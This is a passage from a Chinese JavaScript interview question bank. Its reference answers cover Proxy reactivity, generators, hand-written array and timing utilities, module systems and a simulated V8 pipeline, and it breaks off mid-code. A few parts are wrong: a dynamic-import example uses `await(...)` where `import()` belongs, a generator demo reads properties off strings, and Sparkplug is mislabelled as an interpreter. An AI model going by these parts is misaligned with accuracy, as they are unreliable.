    deleteProperty(target, key) {
      const hadKey = key in target;
      const result = Reflect.deleteProperty(target, key);
      if (hadKey) {
        trigger(target, key);
      }
      return result;
    },
  });
}

// ====== 使用示例 ======
const state = reactive({
  count: 0,
  user: { name: 'Tom' },
});

effect(() => {
  console.log(`count is: ${state.count}`);  // 首次输出: count is: 0
  console.log(`user is: ${state.user.name}`); // 首次输出: user is: Tom
});

state.count = 1;  // 自动触发 effect → 输出: count is: 1, user is: Tom
state.user.name = 'Jerry';  // 自动触发 effect → 输出: count is: 1, user is: Jerry
```

#### 4. Proxy vs Object.defineProperty 对比

| 特性 | Object.defineProperty (Vue 2) | Proxy (Vue 3) |
|:---|:---|:---|
| 监听方式 | 劫持属性 getter/setter | 代理整个对象 |
| 新增属性 | 需要 `$set()` | **自动检测** ✅ |
| 数组变更 | 需要重写数组方法 | **天然支持** ✅ |
| 性能 | 初始化时递归遍历 | **惰性代理**（按需）✅ |
| Map/Set 等 | 不支持 | **支持** ✅ |
| 兼容性 | IE9+ | IE 不支持 |

---

## Q37: 请详细说明 Generator 函数的工作原理，包括 `yield` 和 `yield*` 的区别。并用 Generator 实现异步流程控制。
- **难度**：★★☆
- **知识点**：Generator、yield、迭代器、async/await 底层
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. Generator 基本语法

```javascript
// Generator 函数声明用 function*
function* myGenerator() {
  console.log('开始');
  yield 1;     // 暂停，返回 1
  console.log('继续');
  yield 2;     // 暂停，返回 2
  console.log('结束');
  return 3;    // 最终返回值（done: true 时）
}

const gen = myGenerator();  // 不会执行函数体！只是创建生成器对象

gen.next();  // { value: 1, done: false } — 开始执行到第一个 yield
gen.next();  // { value: 2, done: false } — 从上一个 yield 继续
gen.next();  // { value: 3, done: true }  — 执行到最后 return
gen.next();  // { value: undefined, done: true } — 之后一直返回 done: true
```

#### 2. next() 传参（向 Generator 内部传值）

```javascript
function* paramGen() {
  const a = yield '第一步';  // a 接收外部传入的值
  const b = yield '第二步';
  return a + b;
}

const gen2 = paramGen();

gen2.next();           // { value: '第一步', done: false }
gen2.next(10);         // { value: '第二步', done: false } — a = 10
gen2.next(20);         // { value: 30, done: true } — b = 10 + 20 = 30

// 第一个 next() 的参数会被忽略（因为还没有 yield 来接收它）
// 这就是 async/await 中 await 表达式的值的来源
```

#### 3. yield vs yield*

```javascript
// yield — 产出单个值
function* genA() {
  yield 1;
  yield 2;
  yield 3;
}

// yield* — 委托给另一个可迭代对象（Generator / Array / String / Map 等）
function* genB() {
  yield* genA();  // 委托给 genA，逐个产出 1, 2, 3
  yield* [4, 5];  // 委托给数组
  yield* 'ab';    // 委托给字符串
}

[...genB()];  // [1, 2, 3, 4, 5, 'a', 'b']

// yield* 的本质相当于：
// for (const val of iterable) {
//   yield val;
// }
// 但 yield* 更高效（优化过的语法糖）
```

#### 4. Generator 的错误处理

```javascript
function* errorGen() {
  try {
    yield 1;
    yield 2;
  } catch (e) {
    console.log('内部捕获错误:', e.message);  // '内部捕获错误: 出错了'
    yield 'error recovered';
  }
  yield 3;
}

const gen3 = errorGen();
gen3.next();  // { value: 1, done: false }
gen3.throw(new Error('出错了'));  // 错误被 Generator 内部 try-catch 捕获
                                   // { value: 'error recovered', done: false }
gen3.next();  // { value: 3, done: false }

// 如果内部没有 try-catch，throw 会让 Generator 直接终止（done: true）
```

#### 5. 用 Generator 实现 async/await（核心考点）

```javascript
// async/await 的本质就是 Generator + 自动执行器

// 异步任务模拟
function fetchData(url) {
  return new Promise(resolve => {
    setTimeout(() => resolve(`${url} 的数据`), 1000);
  });
}

// 用 Generator 编写异步代码（看起来像同步）
function* asyncTask() {
  const user = yield fetchData('/api/user');     // yield 出 Promise
  const posts = yield fetchData(`/api/posts/${user.id}`);
  const comments = yield fetchData(`/api/comments/${posts[0].id}`);
  return { user, posts, comments };
}

// 自动执行器 — 核心代码！
function runAsync(generatorFn) {
  const gen = generatorFn();

  return new Promise((resolve, reject) => {
    function step(nextFn) {
      let result;
      try {
        result = nextFn();  // gen.next() 或 gen.throw()
      } catch (err) {
        return reject(err);  // 同步错误
      }

      if (result.done) {
        return resolve(result.value);  // Generator 完成
      }

      // result.value 应该是一个 Promise（由 yield 出来的）
      Promise.resolve(result.value)
        .then(
          (value) => step(() => gen.next(value)),   // 将值传回 Generator
          (error) => step(() => gen.throw(error))   // 将错误抛回 Generator
        );
    }

    step(() => gen.next());  // 启动
  });
}

// 使用
runAsync(asyncTask)
  .then(result => console.log('最终结果:', result))
  .catch(err => console.error('出错:', err));

// 这就是 co 库（早期 async/await polyfill）的核心原理
// 后来 ES2017 将此模式标准化为 async/await 语法糖
```

#### 6. Generator 的其他应用

```javascript
// 应用1：无限序列
function* fibonacci() {
  let [prev, curr] = [0, 1];
  while (true) {
    yield curr;
    [prev, curr] = [curr, prev + curr];
  }
}
const fib = fibonacci();
fib.next().value; // 1
fib.next().value; // 1
fib.next().value; // 2
fib.next().value; // 3
fib.next().value; // 5

// 应用2：状态机
function* trafficLight() {
  while (true) {
    yield 'GREEN';
    yield 'YELLOW';
    yield 'RED';
  }
}
const light = trafficLight();
light.next().value; // 'GREEN'
light.next().value; // 'YELLOW'
light.next().value; // 'RED'
light.next().value; // 'GREEN' — 循环

// 应用3：惰性求值（无限流 + 过滤 + 映射）
function* take(n, iterable) {
  let i = 0;
  for (const val of iterable) {
    if (i++ >= n) return;
    yield val;
  }
}

function* filter(predicate, iterable) {
  for (const val of iterable) {
    if (predicate(val)) yield val;
  }
}

function* map(fn, iterable) {
  for (const val of iterable) {
    yield fn(val);
  }
}

// 组合使用：取前 5 个偶数的平方
function* naturals() {
  let n = 1;
  while (true) yield n++;
}

[...take(5, map(x => x*x, filter(x => x%2===0, naturals())))];
// [4, 16, 36, 64, 100]
```

---

## Q38: 请手写实现以下常用工具函数：map、filter、reduce、bind、call、apply、debounce、throttle。
- **难度**：★★☆
- **知识点**：手写实现、数组方法、函数式编程
- **题型**：编程实践题

### 参考答案要点：

```javascript
// ====== 1. Array.prototype.map ======
Array.prototype.myMap = function(callback, thisArg) {
  if (typeof callback !== 'function') {
    throw new TypeError(callback + ' is not a function');
  }
  const result = [];
  const arr = this;  // this 就是被调用的数组
  for (let i = 0; i < arr.length; i++) {
    // 跳过稀疏数组的空位
    if (i in arr) {
      result[i] = callback.call(thisArg, arr[i], i, arr);
    }
  }
  return result;
};

// ====== 2. Array.prototype.filter ======
Array.prototype.myFilter = function(callback, thisArg) {
  if (typeof callback !== 'function') {
    throw new TypeError(callback + ' is not a function');
  }
  const result = [];
  const arr = this;
  for (let i = 0; i < arr.length; i++) {
    if (i in arr && callback.call(thisArg, arr[i], i, arr)) {
      result.push(arr[i]);
    }
  }
  return result;
};

// ====== 3. Array.prototype.reduce ======
Array.prototype.myReduce = function(callback, initialValue) {
  if (typeof callback !== 'function') {
    throw new TypeError(callback + ' is not a function');
  }
  const arr = this;
  let accumulator;
  let startIndex;

  if (arguments.length >= 2) {
    accumulator = initialValue;
    startIndex = 0;
  } else {
    // 没有 initialValue 时，取第一个元素作为初始值
    startIndex = 1;
    // 空数组且无 initialValue → TypeError
    if (arr.length === 0) {
      throw new TypeError('Reduce of empty array with no initial value');
    }
    accumulator = arr[0];
  }

  for (let i = startIndex; i < arr.length; i++) {
    if (i in arr) {
      accumulator = callback(accumulator, arr[i], i, arr);
    }
  }
  return accumulator;
};

// 测试
[1, 2, 3].myMap(x => x * 2);            // [2, 4, 6]
[1, 2, 3, 4, 5].myFilter(x => x > 2);   // [3, 4, 5]
[1, 2, 3].myReduce((sum, x) => sum + x, 0); // 6
// ====== 4. debounce（防抖）======
function debounce(fn, delay = 300, immediate = false) {
  let timerId = null;

  function debounced(...args) {
    // 如果是立即执行模式且没有定时器
    if (immediate && !timerId) {
      fn.apply(this, args);
    }

    // 每次触发都清除上一个定时器，重新计时
    clearTimeout(timerId);

    timerId = setTimeout(() => {
      timerId = null;
      // 非立即执行模式：延迟结束后执行
      if (!immediate) {
        fn.apply(this, args);
      }
    }, delay);
  }

  // 提供手动取消的方法
  debounced.cancel = function() {
    clearTimeout(timerId);
    timerId = null;
  };

  return debounced;
}

// 使用
const log = debounce(() => console.log('搜索'), 500);
input.addEventListener('input', log);  // 停止输入 500ms 后才执行
// ====== 5. throttle（节流）======

// 版本一：时间戳版本（首次立即执行）
function throttle(fn, interval = 300) {
  let lastTime = 0;

  return function throttled(...args) {
    const now = Date.now();
    if (now - lastTime >= interval) {
      lastTime = now;
      fn.apply(this, args);
    }
  };
}

// 版本二：定时器版本（最后一次也会执行）
function throttleV2(fn, interval = 300) {
  let timerId = null;

  return function throttled(...args) {
    if (!timerId) {
      fn.apply(this, args);  // 首次立即执行
      timerId = setTimeout(() => {
        timerId = null;  // 定时器到期后允许下一次执行
      }, interval);
    }
  };
}

// 版期三：结合版（首次立即执行 + 最后一次也会执行）— 推荐
function throttleV3(fn, interval = 300) {
  let lastTime = 0;
  let timerId = null;

  return function throttled(...args) {
    const now = Date.now();
    const remaining = interval - (now - lastTime);

    if (remaining <= 0) {
      // 距离上次执行已超过间隔时间，立即执行
      if (timerId) {
        clearTimeout(timerId);
        timerId = null;
      }
      lastTime = now;
      fn.apply(this, args);
    } else if (!timerId) {
      // 还没到间隔时间，但也没有待执行的定时器
      // 设置定时器确保最后一次触发也能执行
      timerId = setTimeout(() => {
        lastTime = Date.now();
        timerId = null;
        fn.apply(this, args);
      }, remaining);
    }
  };
}
// ====== call/apply/bind 见 Q18 ======
// （此处不再重复，已在 Q18 中完整实现）
```

#### debounce vs throttle 对比

| 特性 | debounce（防抖） | throttle（节流） |
|:---|:---|:---|
| 行为 | 等待停止后才执行 | 固定间隔执行 |
| 首次触发 | 可配置（immediate） | 通常立即执行 |
| 典型场景 | 搜索输入、窗口 resize | 滚动加载、鼠标移动 |
| 效果 | 合并多次为一次 | 降低执行频率 |
| 类比 | 公交车等人满了再走 | 地铁固定间隔发车 |

---

## Q39: 请详述 JavaScript 模块化的演进历程：IIFE → AMD/CMD → CommonJS → ES Module。
- **难度**：★★☆
- **知识点**：模块化、AMD、CMD、CommonJS、ES Module
- **题型**：简答题

### 参考答案要点：

#### 第一阶段：无模块化（全局变量污染）

```javascript
// 早期 JS：所有脚本共享全局作用域
// app.js
var name = 'global';

// utils.js
var name = 'utils';  // 覆盖了 app.js 的 name！命名冲突
```

#### 第二阶段：IIFE（立即执行函数模拟模块）

```javascript
// IIFE 模式：通过函数作用域隔离
const moduleA = (function() {
  // 私有变量
  let privateVar = 'secret';

  // 私有函数
  function privateHelper() {
    return privateVar.toUpperCase();
  }

  // 公开接口
  return {
    publicMethod: function() {
      return privateHelper();
    }
  };
})();

moduleA.publicMethod(); // 'SECRET'
moduleA.privateVar;    // undefined — 无法访问私有成员

// 依赖管理：通过参数注入
const moduleB = (function($, moduleA) {
  return {
    init() {
      // 使用 jQuery 和 moduleA
    }
  };
})(jQuery, moduleA);

// ⚠️ 局限：仍需手动管理 script 加载顺序和依赖关系
```

#### 第三阶段：AMD（异步模块定义）— RequireJS

```javascript
// AMD 规范：异步加载，依赖前置
define(['jquery', './utils'], function($, utils) {
  // 依赖提前声明并在回调中使用
  return {
    init: function() {
      $('body').text(utils.format('Hello'));
    }
  };
});

// main.js — 入口文件
require(['./app'], function(app) {
  app.init();
});

// 特点：浏览器端，异步加载，依赖前置
// 代表库：RequireJS
// 缺点：代码可读性差（依赖与逻辑分离）；模块加载频繁时有性能开销
```

#### 第四阶段：CMD（通用模块定义）— SeaJS

```javascript
// CMD 规范：就近依赖（按需加载）
define(function(require, exports, module) {
  // 依赖在使用时才 require
  var $ = require('jquery');  // 就近声明

  exports.init = function() {
    $('body').text('Hello CMD');
  };
});

// 特点：依赖就近，延迟执行
// 代表库：SeaJS（玉伯开发，国内流行）
// 与 AMD 区别：AMD 是依赖前置 + 提前执行；CMD 是依赖就近 + 延迟执行
```

#### 第五阶段：CommonJS — Node.js 标准

```javascript
// CommonJS 规范：同步加载，服务端使用
// math.js
const PI = Math.PI;

function add(a, b) { return a + b; }
function multiply(a, b) { return a * b; }

module.exports = { add, multiply, PI };

// app.js
const { add, multiply } = require('./math');
console.log(add(1, 2));  // 3

// 特点：
// 1. 同步 require（适合服务端，文件在本地）
// 2. module.exports 导出
// 3. 运行时加载（值拷贝）
// 4. 循环依赖：拿到的是未完成的部分（exports 的空对象）

// 循环依赖问题
// a.js
console.log('a starting');
exports.done = false;
const b = require('./b');  // 此时 b.js 还没执行完，b.done 还是 undefined
console.log('in a, b.done =', b.done);
exports.done = true;
console.log('a done');

// b.js
console.log('b starting');
exports.done = false;
const a = require('./a');  // a.js 的 exports 已经有 done: false 了
console.log('in b, a.done =', a.done);
exports.done = true;
console.log('b done');

// main.js
require('./a');
// 输出顺序：
// a starting → b starting → in b, a.done = false → b done → in a, b.done = true → a done
```

#### 第六阶段：ES Module（ES2015+，✅ 现代标准）

```javascript
// ES Module 规范：静态分析，编译时确定依赖
// math.mjs (或 package.json 中 "type": "module")
export const PI = Math.PI;

export function add(a, b) {
  return a + b;
}

export default class Calculator {
  // ...
}

// app.mjs
import { add, PI } from './math.mjs';
import Calculator from './calculator.mjs';

console.log(add(1, 2));

// import() 动态导入（返回 Promise）
button.addEventListener('click', async () => {
  const module = await('./heavy-module.mjs');
  module.doSomething();
});

// 特点：
// 1. 静态结构：import/export 必须在顶层（不能在 if/函数内，除非 dynamic import）
// 2. 编译时确定依赖关系（Tree Shaking 的基础）
// 3. 值的引用（live binding）：导出的是绑定而非拷贝
// 4. 严格模式自动开启
// 5. 循环依赖：使用的是「实时绑定」（拿到的是最终的值，不是 undefined）
```

#### 四种模块化对比

| 特性 | IIFE | AMD/CMD | CommonJS | ES Module |
|:---|:---|:---|:---|:---|
| 运行环境 | 浏览器 | 浏览器 | Node.js | 浏览器 + Node |
| 加载方式 | 同步 | 异步 | 同步 | 异步/静态 |
| 依赖时机 | 参数注入 | 声明时/运行时 | 运行时 | **编译时** |
| 值的拷贝/引用 | 引用 | 引用 | **拷贝** | **引用（live binding）** |
| Tree Shaking | ❌ | ❌ | ❌ | ✅ |
| 循环依赖 | 需自行处理 | 支持 | ⚠️ 半成品 | ✅ live binding |
| 顶层 this | window | window | `{}` | `undefined` |
| 当前标准 | 已淘汰 | 已淘汰 | Node 主流 | **标准方向** |

---

# 三、专家层 ★★★（Q40 - Q50）

---

## Q40: 请详细描述 V8 引擎的工作流程，从 JavaScript 源码到机器码的完整过程。
- **难度**：★★★
- **知识点**：V8 引擎、AST、Ignition、TurboFan
- **题型**：简答题

### 参考答案要点：

#### V8 工作全流程

```
JavaScript 源码
      │
      ▼
┌─────────────────┐
│  Parser（解析器） │
│  • Scanner（词法分析）│
│  • Parser（语法分析）│
└────────┬────────┘
         │
         ▼
    Abstract Syntax Tree (AST)  ← 抽象语法树
         │
         ▼
┌───────────────────────┐
│  Ignition（解释器）     │
│  • AST → Bytecode     │ ← 字节码（中间表示）
│  • 快速启动            │
│  • 执行时收集 profiling 信息 │
└────────┬───────────────┘
         │
         ├── 热点代码（多次执行）
         │        │
         │        ▼
         │  ┌──────────────────┐
         │  │ TurboFan（编译器） │
         │  │ Bytecode → 优化的机器码 │
         │  │ • 内联缓存 (IC)    │
         │  │ • 去优化 (Deopt)   │
         │  └──────────────────┘
         │
         ▼
    机器码执行（CPU 直接运行）
```

#### 1. Parser（解析器）

```javascript
// V8 的解析过程：

// 词法分析（Scanner/Tokenizer）
// 将源码字符流转换为 Token 流
// 例如：const x = 1 + 2;
// Tokens: [Identifier(const), Identifier(x), Punctuation(=), Number(1), Operator(+), Number(2), Punctuation(;)]

// 语法分析（Parser）
// 将 Token 流转换为 AST
// AST 示意：
{
  type: 'VariableDeclaration',
  kind: 'const',
  declarations: [{
    type: 'VariableDeclarator',
    id: { type: 'Identifier', name: 'x' },
    init: {
      type: 'BinaryExpression',
      operator: '+',
      left: { type: 'Literal', value: 1 },
      right: { type: 'Literal', value: 2 }
    }
  }]
}

// V8 的解析策略：惰性解析（Lazy Parsing）
// 首次扫描时只解析顶层代码，函数体先不解析（只记录参数和变量名）
// 函数第一次被调用时才完全解析（Preparse → Full Parse）
// 大幅提升首屏加载速度
```

#### 2. Ignition（字节码解释器）

```javascript
// Ignition 是 V8 的字节码解释器（2016 年引入，替代了 Full-Codegen）

// 为什么要引入字节码？
// 1. 减少内存占用（字节码比机器码紧凑得多）
// 2. 加快启动速度（不需要一开始就编译成机器码）
// 3. 为 TurboFan 提供 profiling 信息

// Ignition 生成的字节码示例（概念性的）：
function add(a, b) { return a + b; }
// 大致对应以下字节码指令：
// LdaZero              // 加载 a
// Star r0              // 存入寄存器 r0
// LdaSmi [1]           // 加载 b
// Add r0, [0]          // 相加
// Return               // 返回结果
```

#### 3. TurboFan（优化编译器）

```javascript
// 当 Ignition 发现某段代码是「热点」时（多次执行），
// TurboFan 会将其编译为高度优化的机器码

// 优化技术：
// 1. 内联（Inlining）— 将函数调用替换为函数体本身
// 2. 内联缓存（Inline Cache, IC）— 缓存对象形状（Hidden Class）加速属性访问
// 3. 类型推断（Type Feedback）— 根据 profiling 信息做假设性优化
// 4. 图优化（Graph Optimization）— SSA 形式的 IR 优化

// 去优化（Deoptimization）：
// 如果 TurboFan 的类型假设被打破（如对象形状改变），
// 则丢弃优化代码，回退到 Ignition 解释执行
// 然后重新收集信息，可能再次优化

function optimizeMe(obj) {
  return obj.x + obj.y;
}

// 第一次调用：Ignition 解释执行，收集类型信息
optimizeMe({ x: 1, y: 2 });  // obj 是 {x: number, y: number}

// 多次调用后：TurboFan 编译优化（假设 obj 总是有 x 和 y 的数字属性）
// 优化后的机器码类似：直接从固定偏移位置读取数值并相加

// 但如果突然传入不同形状的对象：
optimizeMe({ x: 1, y: 2, z: 3 });  // 形状变了！→ 去优化！
optimizeMe({ x: 'a', y: 'b' });    // 类型变了！→ 去优化！
```

#### 4. Hidden Class（隐藏类）— 属性访问加速的秘密

```javascript
// V8 用 Hidden Class（也叫 Map 或 Shape）来优化对象属性访问
// 类似于 Java/C++ 的类布局

function Point(x, y) {
  this.x = x;  // 创建 HiddenClass C1: {x}
  this.y = y;  // 转换为 HiddenClass C2: {x, y}
}

const p1 = new Point(1, 2);
const p2 = new Point(3, 4);
// p1 和 p2 共享同一个 HiddenClass C2（相同构造顺序）
// V8 可以将属性访问优化为固定的内存偏移量查找（O(1)）

// ⚠️ 破坏 Hidden Class 共享的情况：
const p3 = new Point(5, 6);
p3.z = 7;  // p3 现在有新的 HiddenClass C3: {x, y, z}
// p1/p2 仍然是 C2，p3 是 C3 — 分裂了！

// 更糟糕的：
const p4 = {};
p4.a = 1;  // HC1
p4.b = 2;  // HC2
p4.c = 3;  // HC3
// 每次添加新属性都创建新的 Hidden Class — 非常低效！
// 建议：在构造函数中一次性声明所有属性
```

#### 5. Orinoco & Sparkplug（V8 新架构组件）

```
Orinoco — 垃圾回收器（并行/并发 GC）
Sparkplug — 新的解释器（2020 年引入，进一步优化热点代码路径）
Maglev — 中间层编译器（介于 Ignition 和 TurboFan 之间，快速生成中等优化代码）
```

### 深度拓展：手写实现

#### 手写简化版 V8 编译器模拟（伪代码）

```javascript
/**
 * V8 引擎编译流程模拟器
 * 
 * 本模拟器用 JavaScript 伪代码展示 V8 从源码到机器码的完整过程
 * 包括：Parser → AST → Ignition Bytecode → TurboFan Machine Code
 * 
 * ⚠️ 注意：这是概念性模拟，真实 V8 是 C++ 实现，远比这复杂！
 */

// ==================== 阶段1：词法分析器（Scanner/Tokenizer）====================

/**
 * 词法分析器 - 将源码字符流转换为 Token 流
 */
class Scanner {
  constructor(source) {
    this.source = source;       // 源码字符串
    this.position = 0;          // 当前位置
    this.line = 1;              // 当前行号
    this.column = 1;            // 当前列号
    this.tokens = [];           // 输出的 Token 数组
  }

  /**
   * 扫描整个源码，生成 Token 数组
   * @returns {Array<Token>} Token 数组
   */
  tokenize() {
    while (!this.isAtEnd()) {
      this.scanToken();
    }
    
    // 添加文件结束标记
    this.tokens.push({
      type: 'EOF',
      value: null,
      line: this.line,
      column: this.column,
    });
    
    return this.tokens;
  }

  scanToken() {
    const char = this.advance(); // 消费当前字符
    
    // 处理单字符 Token
    switch (char) {
      case '(': this.addToken('LEFT_PAREN'); break;
      case ')': this.addToken('RIGHT_PAREN'); break;
      case '{': this.addToken('LEFT_BRACE'); break;
      case '}': this.addToken('RIGHT_BRACE'); break;
      case ';': this.addToken('SEMICOLON'); break;
      case ',': this.addToken('COMMA'); break;
      case '.': this.addToken('DOT'); break;
      case '-': this.addToken('MINUS'); break;
      case '+': this.addToken('PLUS'); break;
      case '/': this.addToken('SLASH'); break;
      case '*': this.addToken('STAR'); break;
      
      // 处理可能的双字符运算符
      case '!':
        this.addToken(this.match('=') ? 'BANG_EQUAL' : 'BANG');
        break;
      case '=':
        this.addToken(this.match('=') ? 'EQUAL_EQUAL' : 'EQUAL');
        break;
      case '<':
        this.addToken(this.match('=') ? 'LESS_EQUAL' : 'LESS');
        break;
      case '>':
        this.addToken(this.match('=') ? 'GREATER_EQUAL' : 'GREATER');
        break;
        
      // 忽略空白字符（空格、制表符、换行等）
      case ' ':
      case '\r':
      case '\t':
        break;
      case '\n':
        this.line++;
        this.column = 0;
        break;
        
      // 字符串字面量
      case '"':
        this.string();
        break;
        
      default:
        if (this.isDigit(char)) {
          this.number();
        } else if (this.isAlpha(char)) {
          this.identifier();
        } else {
          throw new Error(`Unexpected character: ${char} at line ${this.line}`);
        }
    }
  }

  // ... 其他辅助方法（advance, match, peek, string, number, identifier 等）
}

// Token 类型定义示例：
const TokenType = {
  // 字面量
  NUMBER: 'NUMBER',         // 数字（如 42, 3.14）
  STRING: 'STRING',         // 字符串（如 "hello"）
  IDENTIFIER: 'IDENTIFIER', // 标识符（如变量名、函数名）
  
  // 关键字
  CONST: 'CONST',           // const
  LET: 'LET',               // let
  FUNCTION: 'FUNCTION',     // function
  RETURN: 'RETURN',         // return
  IF: 'IF',                 // if
  ELSE: 'ELSE',             // else
  TRUE: 'TRUE',             // true
  FALSE: 'FALSE',           // false
  
  // 运算符
  PLUS: '+',                // 加法
  MINUS: '-',               // 减法
  STAR: '*',                // 乘法
  SLASH: '/',               // 除法
  EQUAL: '=',              // 赋值
  EQUAL_EQUAL: '==',       // 相等比较
  
  // 分隔符
  LEFT_PAREN: '(',          // 左括号
  RIGHT_PAREN: ')',         // 右括号
  LEFT_BRACE: '{',          // 左花括号
  RIGHT_BRACE: '}',         // 右花括号
  SEMICOLON: ';',           // 分号
};

// ==================== 阶段2：语法分析器（Parser）→ AST ====================

/**
 * AST 节点类型定义
 */
const ASTNodeType = {
  Program: 'Program',                    // 程序根节点
  VariableDeclaration: 'VariableDeclaration',  // 变量声明
  FunctionDeclaration: 'FunctionDeclaration',  // 函数声明
  ExpressionStatement: 'ExpressionStatement',  // 表达式语句
  CallExpression: 'CallExpression',            // 函数调用
  BinaryExpression: 'BinaryExpression',        // 二元表达式（如 a + b）
  Identifier: 'Identifier',                    // 标识符引用
  Literal: 'Literal',                          // 字面量（数字、字符串、布尔值）
  ReturnStatement: 'ReturnStatement',          // return 语句
  BlockStatement: 'BlockStatement',            // 代码块
};

/**
 * 语法分析器 - 将 Token 流转换为 AST（抽象语法树）
 */
class Parser {
  constructor(tokens) {
    this.tokens = tokens;   // 来自 Scanner 的 Token 数组
    this.current = 0;       // 当前 Token 索引
  }

  /**
   * 解析程序入口
   * @returns {ASTNode} AST 根节点
   */
  parse() {
    const statements = [];
    
    while (!this.isAtEnd()) {
      statements.push(this.parseDeclaration());
    }
    
    return {
      type: ASTNodeType.Program,
      body: statements,
    };
  }

  /**
   * 解析声明（变量声明、函数声明等）
   */
  parseDeclaration() {
    if (this.check(TokenType.CONST) || this.check(TokenType.LET)) {
      return this.parseVariableDeclaration();
    }
    if (this.check(TokenType.FUNCTION)) {
      return this.parseFunctionDeclaration();
    }
    return this.parseStatement();
  }

  /**
   * 解析变量声明：const x = expr;
   */
  parseVariableDeclaration() {
    const kind = this.advance().value;  // 'const' 或 'let'
    const name = this.consume(TokenType.IDENTIFIER, 'Expected variable name').value;
    this.consume(TokenType.EQUAL, "Expected '=' after variable name");
    const initializer = this.parseExpression();
    this.consume(TokenType.SEMICOLON, "Expected ';' after expression");
    
    return {
      type: ASTNodeType.VariableDeclaration,
      kind,           // 'const' 或 'let'
      name: {         // 变量名（标识符节点）
        type: ASTNodeType.Identifier,
        name: name,
      },
      initializer,    // 初始化表达式（如 BinaryExpression 或 Literal）
    };
  }

  /**
   * 解析二元表达式：a + b * c
   * 使用递归下降解析，处理运算符优先级
   */
  parseExpression() {
    return this.parseAddition();
  }

  parseAddition() {
    let left = this.parseMultiplication();
    
    while (this.matchType(TokenType.PLUS) || this.matchType(TokenType.MINUS)) {
      const operator = this.previous();
      const right = this.parseMultiplication();
      
      left = {
        type: ASTNodeType.BinaryExpression,
        operator: operator.value,  // '+' 或 '-'
        left,
        right,
      };
    }
    
    return left;
  }

  parseMultiplication() {
    let left = this.parsePrimary();
    
    while (this.matchType(TokenType.STAR) || this.matchType(TokenType.SLASH)) {
      const operator = this.previous();
      const right = this.parsePrimary();
      
      left = {
        type: ASTNodeType.BinaryExpression,
        operator: operator.value,  // '*' 或 '/'
        left,
        right,
      };
    }
    
    return left;
  }

  /**
   * 解析基本表达式（数字、字符串、标识符、括号表达式）
   */
  parsePrimary() {
    if (this.matchType(TokenType.NUMBER)) {
      return {
        type: ASTNodeType.Literal,
        value: Number(this.previous().value),
        raw: this.previous().value,
      };
    }
    
    if (this.matchType(TokenType.STRING)) {
      return {
        type: ASTNodeType.Literal,
        value: this.previous().value.slice(1, -1),  // 去掉引号
        raw: this.previous().value,
      };
    }
    
    if (this.matchType(TokenType.IDENTIFIER)) {
      return {
        type: ASTNodeType.Identifier,
        name: this.previous().value,
      };
    }
    
    if (this.matchType(TokenType.LEFT_PAREN)) {
      const expr = this.parseExpression();
      this.consume(TokenType.RIGHT_PAREN, "Expected ')' after expression");
      return expr;  // 返回括号内的表达式（不创建额外节点）
    }
    
    throw new Error(`Unexpected token: ${this.peek().type}`);
  }

  // ... 其他辅助方法（consume, check, match, advance 等）
}

// ==================== 示例：源码 → AST 转换演示 ====================

console.log('========== V8 编译流程模拟 ==========\n');

// 示例源码
const sourceCode = `
function add(a, b) {
  return a + b;
}
const result = add(1, 2);
`;

console.log('📝 原始源码:');
console.log(sourceCode);

// 步骤1：词法分析 → Token 流
console.log('\n--- 阶段1：词法分析（Scanner）---');
const scanner = new Scanner(sourceCode.trim());
const tokens = scanner.tokenize();

console.log('📋 生成的 Token 流（前20个）:');
tokens.slice(0, 20).forEach((token, i) => {
  console.log(`  [${i}] ${token.type.padEnd(15)} ${token.value !== null ? `"${token.value}"` : ''}`);
});

// 步骤2：语法分析 → AST
console.log('\n--- 阶段2：语法分析（Parser）→ AST ---');
const parser = new Parser(tokens);
const ast = parser.parse();

console.log('🌳 生成的 AST（JSON 格式）:');
console.log(JSON.stringify(ast, null, 2));

// ==================== 阶段3：Ignition 字节码生成器 ====================

/**
 * 字节码指令集（V8 Ignition 的简化版）
 * 实际 V8 的字节码更复杂，有上百种指令
 */
const BytecodeOpcode = {
  // 栈操作
  LdaZero: 'LdaZero',             // 加载常量 0 到累加器
  LdaSmi: 'LdaSmi',               // 加载小整数（Smi）到累加器
  LdaConstant: 'LdaConstant',     // 加载常量池中的值到累加器
  Star: 'Star',                   // 存储累加器到寄存器
  
  // 算术运算
  Add: 'Add',                     // 加法：acc = acc + reg[operand]
  Sub: 'Sub',                     // 减法
  Mul: 'Mul',                     // 乘法
  Div: 'Div',                     // 除法
  
  // 控制流
  Return: 'Return',               // 返回 acc 的值
  Call: 'Call',                   // 函数调用
  
  // 对象属性操作
  LdaNamedProperty: 'LdaNamedProperty',  // 加载命名属性
  StaNamedProperty: 'StaNamedProperty',  // 存储命名属性
};

/**
 * Ignition 字节码编译器 - 将 AST 编译为字节码
 */
class IgnitionCompiler {
  constructor() {
    this.bytecode = [];      // 输出的字节码数组
    this.constantPool = [];  // 常量池（存储字符串、大数字等）
    this.registerCount = 0;  // 寄存器计数
  }

  /**
   * 编译 AST 为字节码
   * @param {ASTNode} ast - 抽象语法树
   * @returns {Object} 包含字节码和元数据
   */
  compile(ast) {
    console.log('\n--- 阶段3：Ignition 字节码编译 ---');
    
    // 编译函数声明
    if (ast.type === ASTNodeType.Program) {
      for (const statement of ast.body) {
        this.compileNode(statement);
      }
    } else {
      this.compileNode(ast);
    }
    
    return {
      bytecode: this.bytecode,
      constantPool: this.constantPool,
      registerCount: this.registerCount,
    };
  }

  compileNode(node) {
    switch (node.type) {
      case ASTNodeType.FunctionDeclaration:
        this.compileFunction(node);
        break;
        
      case ASTNodeType.VariableDeclaration:
        this.compileVariableDeclaration(node);
        break;
        
      case ASTNodeType.ReturnStatement:
        this.compileReturn(node);
        break;
        
      case ASTNodeType.BinaryExpression:
        this.compileBinaryExpression(node);
        break;
        
      case ASTNodeType.CallExpression:
        this.compileCallExpression(node);
        break;
        
      case ASTNodeType.Literal:
        this.compileLiteral(node);
        break;
        
      case ASTNodeType.Identifier:
        this.compileIdentifier(node);
        break;
        
      default:
        console.warn(`未处理的 AST 节点类型: ${node.type}`);
    }
  }

  compileFunction(node) {
    console.log(`\n🔧 编译函数: ${node.name.name}`);
    
    // 创建新的字节码序列（每个函数有自己的字节码）
    const functionBytecode = [];
    
    // 参数处理：将参数加载到寄存器
    node.params.forEach((param, index) => {
      functionBytecode.push({
        opcode: BytecodeOpcode.Star,
        operand: index,  // 寄存器索引
        comment: `存储参数 ${param.name} 到 r${index}`,
      });
    });
    
    // 编译函数体
    node.body.forEach(stmt => {
      // 递归编译函数体内的语句...
